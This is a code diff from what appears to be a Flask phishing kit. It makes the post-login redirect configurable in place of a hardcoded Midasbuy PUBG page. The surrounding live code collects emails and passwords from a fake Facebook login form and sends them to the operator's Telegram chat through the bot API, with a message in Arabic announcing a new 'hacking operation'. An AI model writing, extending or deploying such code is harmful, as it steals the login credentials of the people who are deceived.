@@ -23,6 +23,7 @@ app = Flask(__name__)
 
 token = Config.BOT_TOKEN
 userSudo = Config.User_Id
+link_after_login = Config.link_after_login
 
 
 def get_pass():
@@ -85,7 +86,7 @@ def facebook():
             text = f'😈عمليه تهكير جديده\n email: `{email}`\n password: `{pas}`'
             requests.get(
                 f'https://api.telegram.org/bot{token}/sendMessage?chat_id={userSudo}&text={text}&parse_mode=Markdown')
-            return redirect("https://www.midasbuy.com/midasbuy/sa/homepage/pubgm")
+            return redirect(link_after_login)
         return render_template('facebook/facebook_login.html', form=text_form)
     return render_template('home.html')
 
